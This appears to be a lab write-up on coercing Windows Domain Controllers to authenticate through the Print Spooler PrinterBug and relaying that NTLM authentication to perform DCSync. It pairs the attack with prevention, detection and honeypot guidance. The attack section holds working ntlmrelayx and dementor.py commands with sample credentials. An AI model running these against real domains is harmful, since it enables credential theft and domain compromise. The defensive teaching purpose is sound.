# 🖨️ Print Spooler & NTLM Relaying

## 📖 Description

The Print Spooler is an old service enabled by default, even with the latest Windows Desktop and Servers versions. The service became a popular attack vector when in 2018, Lee Christensen found the PrinterBug. The functions `RpcRemoteFindFirstPrinterChangeNotification` and `RpcRemoteFindFirstPrinterChangeNotificationEx` can be abused to force a remote machine to perform a connection to any other machine it can reach. Moreover, the reverse connection will carry authentication information as a TGT. Therefore, any domain user can coerce RemoteServer$ to authenticate to any machine. Microsoft's stance on the PrinterBug was that it will not be fixed, as the issue is "by-design".

The impact of PrinterBug is that any Domain Controller that has the Print Spooler enabled can be compromised in one of the following ways:

* Relay the connection to another DC and perform DCSync (if SMB Signing is disabled).
* Force the Domain Controller to connect to a machine configured for Unconstrained Delegation (UD) - this will cache the TGT in the memory of the UD server, which can be captured/exported with tools like Rubeus and Mimikatz.
* Relay the connection to Active Directory Certificate Services to obtain a certificate for the Domain Controller. Threat agents can then use the certificate on-demand to authenticate and pretend to be the Domain Controller (e.g., DCSync).
* Relay the connection to configure Resource-Based Kerberos Delegation for the relayed machine. We can then abuse the delegation to authenticate as any Administrator to that machine.

---

# 🔴 Attack

In this attack path, we will relay the connection to another DC and perform DCSync (i.e., the first compromise technique listed). For the attack to succeed, SMB Signing on Domain Controllers must be turned off.

To begin, we will configure NTLMRelayx to forward any connections to DC2 and attempt to perform the DCSync attack:

```shellsession id="gq7w4m"
@htb[/htb]$ impacket-ntlmrelayx -t dcsync://172.16.18.4 -smb2support
```

<img width="639" height="438" alt="image" src="https://github.com/user-attachments/assets/5f1d8ad7-e480-404e-9c06-aff583dd9229" />

<img width="1034" height="731" alt="image" src="https://github.com/user-attachments/assets/31cbedf8-0c82-495b-9945-6591eb27ee9f" />

Next, we need to trigger the PrinterBug using the Kali box with NTLMRelayx listening. To trigger the connection back, we'll use Dementor (when running from a non-domain joined machine, any authenticated user credentials are required, and in this case, we assumed that we had previously compromised Bob):

```shellsession id="f7j1v9"
python3 ./dementor.py 172.16.18.20 172.16.18.3 -u bob -d eagle.local -p Slavi123
```

<img width="879" height="152" alt="image" src="https://github.com/user-attachments/assets/ba1fc314-f898-4b3e-bef9-a62259190b1d" />

Now, switching back to the terminal session with NTLMRelayx, we will see that DCSync was successful:

<img width="1834" height="927" alt="image" src="https://github.com/user-attachments/assets/25d22926-7299-4791-a865-14d57a589b08" />

---

# 🛡️ Prevention

Print Spooler should be disabled on all servers that are not printing servers. Domain Controllers and other core servers should never have additional roles/functionalities that open and widen the attack surface toward the core AD infrastructure.

Additionally, there is an option to prevent the abuse of the PrinterBug while keeping the service running: when disabling the registry key `RegisterSpoolerRemoteRpcEndPoint`, any incoming remote requests get blocked; this acts as if the service was disabled for remote clients. Setting the registry key to 1 enables it, while 2 disables it:

<img width="1877" height="503" alt="image" src="https://github.com/user-attachments/assets/f7eee2fc-7f96-4e09-ad4f-c73aca960ff9" />

### 🔐 Disable Unnecessary Services

The simplest defensive approach is to disable the Print Spooler wherever printing functionality is not required. This reduces the number of services that an attacker can abuse to coerce authentication from sensitive systems.

### 🛡️ Protect Domain Controllers

Domain Controllers should have a minimal attack surface. Unnecessary services and functionality should be removed or disabled, especially when they provide remote access or communication mechanisms that are not required by the Domain Controller.

### 🔒 Enable SMB Signing

Since the attack path described above relies on relaying authentication to another Domain Controller, SMB Signing is an important protection. Ensuring SMB Signing is properly enforced can prevent certain NTLM relay attacks from succeeding.

### 🔎 Review Remote RPC Exposure

Organizations should regularly review which systems allow remote Print Spooler/RPC functionality and determine whether those connections are actually required. Reducing unnecessary remote access can limit the systems that can be coerced into authenticating.

### 📋 Apply Security Baselines

Windows security baselines and organizational configuration policies can help ensure that services such as Print Spooler are consistently configured across servers. This is particularly useful because manually disabling a service on individual machines can lead to inconsistent security configurations.

---

# 🔎 Detection

Exploiting the PrinterBug will leave traces of network connections toward the Domain Controller; however, they are too generic to be used as a detection mechanism.

In the case of using NTLMRelayx to perform DCSync, no event ID 4662 is generated (as mentioned in the DCSync section); however, to obtain the hashes as DC1 from DC2, there will be a successful logon event for DC1. This event originates from the IP address of the Kali machine, not the Domain Controller, as we can see below:

<img width="1276" height="1295" alt="image" src="https://github.com/user-attachments/assets/62dbd5fd-4133-4c24-bd81-56a0b90255a6" />

A suitable detection mechanism always correlates all logon attempts from core infrastructure servers to their respective IP addresses (which should be static and known).

---

# 🪤 Honeypot

It is possible to use the PrinterBug as means of alerting on suspicious behavior in the environment. In this scenario, we would block outbound connections from our servers to ports 139 and 445; software or physical firewalls can achieve this. Even though abuse can trigger the bug, the firewall rules will disallow the reverse connection to reach the threat agent. However, those blocked connections will act as signs of compromise for the blue team. Before enforcing anything related to this exploit, we should ensure that we have sufficient logs and knowledge of our environment to ensure that legitimate connections are allowed (for example, we must keep the mentioned ports open between DCs, so that they can replicate data).

While this may seem suitable for a honeypot to trick adversaries, we should be careful before implementing it, as currently, the bug requires the machine to connect back to us, but if a new unknown bug is discovered, which allows for some type of Remote Code Execution without the reverse connection, then this will backfire on us. Therefore, we should only consider this option if we are an extremely mature organization and can promptly act on alerts and disable the service on all devices should a new bug be discovered.

---

# 🎯 What Does “Print Spooler & NTLM Relaying” Actually Mean?

**Print Spooler & NTLM Relaying** describes the combination of two concepts: abusing the Print Spooler to **coerce a machine into authenticating** and then **relaying that authentication to another service**.

The Print Spooler is a legitimate Windows service, and NTLM authentication/SMB communication are also legitimate technologies. The security problem occurs when an attacker can abuse the Print Spooler to make a sensitive system authenticate and then take advantage of authentication that is not sufficiently protected against relay attacks.

The main lesson is that **unnecessary services and weak authentication protections can work together to create a much larger attack path**. Disabling unnecessary Print Spooler functionality, protecting Domain Controllers, and enforcing protections such as SMB Signing can significantly reduce this type of risk.
